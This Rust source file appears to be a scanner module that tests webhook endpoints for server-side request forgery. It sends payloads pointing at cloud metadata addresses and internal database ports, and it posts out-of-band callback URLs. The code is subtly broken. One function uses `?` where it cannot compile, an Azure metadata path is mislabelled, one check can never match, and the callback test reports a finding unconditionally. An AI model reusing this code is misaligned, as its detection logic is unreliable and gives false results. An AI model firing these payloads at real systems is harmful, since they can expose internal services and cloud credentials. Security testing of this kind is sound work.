//! Webhook SSRF Detection Module
//! Detects SSRF via webhook endpoints using OOB callbacks and metadata markers.

use crate::checks::module::{CheckModule, CheckResult, Severity};
use crate::findings::cache_evidence::CacheEvidence;
use crate::http_client::HttpClient;
use std::collections::HashMap;

/// Common webhook endpoint patterns
const WEBHOOK_ENDPOINTS: &[&str] = &[
    "/webhook",
    "/webhooks",
    "/callback",
    "/callbacks",
    "/notify",
    "/notification",
    "/notifications",
    "/hook",
    "/hooks",
    "/api/webhook",
    "/api/callback",
    "/integration",
    "/integrations",
];

/// SSRF payload targets for webhook testing
const SSRF_TARGETS: &[&str] = &[
    "http://169.254.169.254/latest/meta-data/",  // AWS
    "http://metadata.google.internal/",           // GCP
    "http://169.254.169.254/computeMetadata/",    // Azure
    "http://localhost:8080",
    "http://127.0.0.1:6379",  // Redis
    "http://127.0.0.1:27017", // MongoDB
    "http://127.0.0.1:9200",  // Elasticsearch
    "http://internal.service.local/",
];

/// OOB callback indicators
const OOB_INDICATORS: &[&str] = &[
    "dns.rebinding.test",
    "oob.interact.sh",
    "burpcollaborator",
    "requestbin",
    "webhook.site",
];

pub struct WebhookSSRFChecker {
    http_client: HttpClient,
    oob_callback_url: Option<String>,
}

impl WebhookSSRFChecker {
    pub fn new(http_client: HttpClient, oob_callback_url: Option<String>) -> Self {
        Self {
            http_client,
            oob_callback_url,
        }
    }

    /// Test webhook endpoint for SSRF vulnerability
    async fn test_webhook_ssrf(
        &self,
        base_url: &str,
        endpoint: &str,
        ssrf_target: &str,
    ) -> Option<CacheEvidence> {
        let webhook_url = format!("{}{}", base_url, endpoint);
        
        // Create SSRF payload
        let payload = self.create_ssrf_payload(ssrf_target);
        let mut headers = HashMap::new();
        headers.insert("Content-Type".to_string(), "application/json".to_string());
        
        let response = self.http_client.post_with_headers(&webhook_url, &payload, &headers).await.ok()?;
        
        // Check if SSRF was successful
        if self.detect_ssrf_success(&response, ssrf_target) {
            return Some(CacheEvidence {
                url: webhook_url,
                vulnerability_type: "webhook_ssrf".to_string(),
                extension_used: format!("SSRF target: {}", ssrf_target),
                original_path: endpoint.to_string(),
                edge_headers: response.headers.clone(),
                cache_status: response.cache_status.unwrap_or_default(),
                severity: self.classify_ssrf_severity(ssrf_target),
                description: format!(
                    "SSRF via webhook endpoint: {} successfully accessed internal resource {}",
                    endpoint, ssrf_target
                ),
            });
        }
        
        None
    }

    /// Create SSRF payload for webhook
    fn create_ssrf_payload(&self, target: &str) -> String {
        // Multiple payload formats to try
        serde_json::json!({
            "url": target,
            "callback_url": target,
            "webhook_url": target,
            "target": target,
            "endpoint": target,
            "uri": target,
        })
        .to_string()
    }

    /// Detect if SSRF was successful
    fn detect_ssrf_success(
        &self,
        response: &crate::http_client::HttpResponse,
        target: &str,
    ) -> bool {
        // Check response body for metadata service responses
        let body_lower = response.body.to_lowercase();
        
        // AWS metadata indicators
        if target.contains("169.254.169.254") {
            if body_lower.contains("ami-id")
                || body_lower.contains("instance-id")
                || body_lower.contains("iam")
                || body_lower.contains("security-credentials")
            {
                return true;
            }
        }
        
        // GCP metadata indicators
        if target.contains("metadata.google.internal") {
            if body_lower.contains("project")
                || body_lower.contains("instance")
                || body_lower.contains("serviceAccounts")
            {
                return true;
            }
        }
        
        // Generic internal service indicators
        if body_lower.contains("redis")
            || body_lower.contains("mongodb")
            || body_lower.contains("elasticsearch")
        {
            return true;
        }
        
        // Error messages that indicate connection to internal service
        if body_lower.contains("connection refused")
            && (target.contains("localhost") || target.contains("127.0.0.1"))
        {
            return true;
        }
        
        false
    }

    /// Classify SSRF severity based on target
    fn classify_ssrf_severity(&self, target: &str) -> Severity {
        if target.contains("169.254.169.254") 
            || target.contains("metadata.google.internal")
        {
            // Cloud metadata is critical
            Severity::Critical
        } else if target.contains("localhost") 
            || target.contains("127.0.0.1")
            || target.contains("internal")
        {
            // Internal network access is high
            Severity::High
        } else {
            Severity::Medium
        }
    }

    /// Test OOB callback via webhook
    async fn test_oob_callback(&self, base_url: &str, endpoint: &str) -> Vec<CacheEvidence> {
        let mut findings = Vec::new();
        
        if let Some(callback_url) = &self.oob_callback_url {
            let webhook_url = format!("{}{}", base_url, endpoint);
            
            // Send payload with OOB callback URL
            let payload = serde_json::json!({
                "callback_url": callback_url,
                "webhook_url": callback_url,
                "notify_url": callback_url,
            })
            .to_string();
            
            let mut headers = HashMap::new();
            headers.insert("Content-Type".to_string(), "application/json".to_string());
            
            let _response = self.http_client.post_with_headers(&webhook_url, &payload, &headers).await;
            
            // Note: In a real implementation, we would wait for the OOB callback
            // For now, we just note that the webhook accepted an external URL
            findings.push(CacheEvidence {
                url: webhook_url,
                vulnerability_type: "webhook_oob_callback".to_string(),
                extension_used: format!("OOB callback: {}", callback_url),
                original_path: endpoint.to_string(),
                edge_headers: HashMap::new(),
                cache_status: String::new(),
                severity: Severity::Medium,
                description: format!(
                    "Webhook {} accepts external callback URLs - may enable OOB data exfiltration",
                    endpoint
                ),
            });
        }
        
        findings
    }

    /// Test for URL parameter manipulation in webhooks
    async fn test_url_parameter_ssrf(&self, base_url: &str, endpoint: &str) -> Vec<CacheEvidence> {
        let mut findings = Vec::new();
        
        for target in SSRF_TARGETS {
            // Try as query parameter
            let url = format!("{}{}?url={}", base_url, endpoint, urlencoding::encode(target));
            let response = self.http_client.get(&url).await.ok()?;
            
            if self.detect_ssrf_success(&response, target) {
                findings.push(CacheEvidence {
                    url: url.clone(),
                    vulnerability_type: "webhook_url_param_ssrf".to_string(),
                    extension_used: format!("url={}", target),
                    original_path: endpoint.to_string(),
                    edge_headers: response.headers.clone(),
                    cache_status: response.cache_status.unwrap_or_default(),
                    severity: self.classify_ssrf_severity(target),
                    description: format!("SSRF via URL parameter in webhook: {}", endpoint),
                });
            }
        }
        
        findings
    }

    /// Analyze webhook configuration exposure
    fn analyze_webhook_config(&self, response: &crate::http_client::HttpResponse) -> Vec<String> {
        let mut findings = Vec::new();
        
        // Check for webhook configuration in response
        let body_lower = response.body.to_lowercase();
        
        if body_lower.contains("webhook_secret") 
            || body_lower.contains("webhook_token")
            || body_lower.contains("hmac")
        {
            findings.push("Webhook secrets or tokens exposed in response".to_string());
        }
        
        if body_lower.contains("callback_urls") 
            || body_lower.contains("registered_webhooks")
        {
            findings.push("Webhook registration details exposed".to_string());
        }
        
        findings
    }
}

#[async_trait::async_trait]
impl CheckModule for WebhookSSRFChecker {
    fn name(&self) -> &'static str {
        "webhook_ssrf"
    }

    fn description(&self) -> &'static str {
        "Detects SSRF vulnerabilities via webhook endpoints using OOB callbacks and metadata probes"
    }

    async fn scan(&self, target: &str) -> Vec<CheckResult> {
        let mut results = Vec::new();
        
        // Test each webhook endpoint
        for endpoint in WEBHOOK_ENDPOINTS {
            // Test SSRF targets
            for ssrf_target in SSRF_TARGETS {
                if let Some(evidence) = self.test_webhook_ssrf(target, endpoint, ssrf_target).await {
                    results.push(CheckResult {
                        check_name: self.name(),
                        severity: evidence.severity,
                        finding: evidence.description,
                        evidence: serde_json::to_value(&evidence).unwrap_or_default(),
                        remediation: "Validate and whitelist allowed webhook callback URLs. \
                                      Block requests to internal IP ranges and cloud metadata services. \
                                      Implement egress filtering.".to_string(),
                    });
                }
            }
            
            // Test OOB callbacks
            for evidence in self.test_oob_callback(target, endpoint).await {
                results.push(CheckResult {
                    check_name: self.name(),
                    severity: evidence.severity,
                    finding: evidence.description,
                    evidence: serde_json::to_value(&evidence).unwrap_or_default(),
                    remediation: "Validate callback URLs against allowlist. \
                                  Require authentication for webhook registration.".to_string(),
                });
            }
            
            // Test URL parameter SSRF
            for evidence in self.test_url_parameter_ssrf(target, endpoint).await {
                results.push(CheckResult {
                    check_name: self.name(),
                    severity: evidence.severity,
                    finding: evidence.description,
                    evidence: serde_json::to_value(&evidence).unwrap_or_default(),
                    remediation: "Do not accept arbitrary URLs in query parameters. \
                                  Validate all user-supplied URLs.".to_string(),
                });
            }
        }
        
        results
    }

    fn supported_checks(&self) -> Vec<&'static str> {
        vec![
            "webhook_ssrf",
            "oob_callback_abuse",
            "cloud_metadata_access",
            "internal_network_probing",
            "url_parameter_ssrf",
        ]
    }
}

// Simple URL encoding helper (in real code, use the urlencoding crate)
mod urlencoding {
    pub fn encode(s: &str) -> String {
        s.chars()
            .map(|c| {
                if c.is_alphanumeric() || matches!(c, '-' | '_' | '.' | '~') {
                    c.to_string()
                } else {
                    format!("%{:02X}", c as u8)
                }
            })
            .collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_webhook_endpoints_defined() {
        assert!(!WEBHOOK_ENDPOINTS.is_empty());
        assert!(WEBHOOK_ENDPOINTS.contains(&"/webhook"));
    }

    #[test]
    fn test_ssrf_targets_defined() {
        assert!(!SSRF_TARGETS.is_empty());
        assert!(SSRF_TARGETS.iter().any(|t| t.contains("169.254.169.254")));
    }

    #[test]
    fn test_classify_ssrf_severity() {
        let checker = WebhookSSRFChecker::new(HttpClient::default(), None);
        
        assert_eq!(
            checker.classify_ssrf_severity("http://169.254.169.254/latest/meta-data/"),
            Severity::Critical
        );
        assert_eq!(
            checker.classify_ssrf_severity("http://localhost:8080"),
            Severity::High
        );
    }
}
